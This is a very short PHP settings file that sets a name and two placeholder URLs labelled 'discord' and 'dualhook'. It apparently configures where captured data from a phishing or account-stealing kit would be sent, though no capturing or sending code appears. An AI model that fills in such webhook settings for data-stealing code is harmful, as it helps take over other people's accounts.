<?php
$name = 'WxR';
$discord = 'discord url';
$dualhook = 'dualhook url';
?>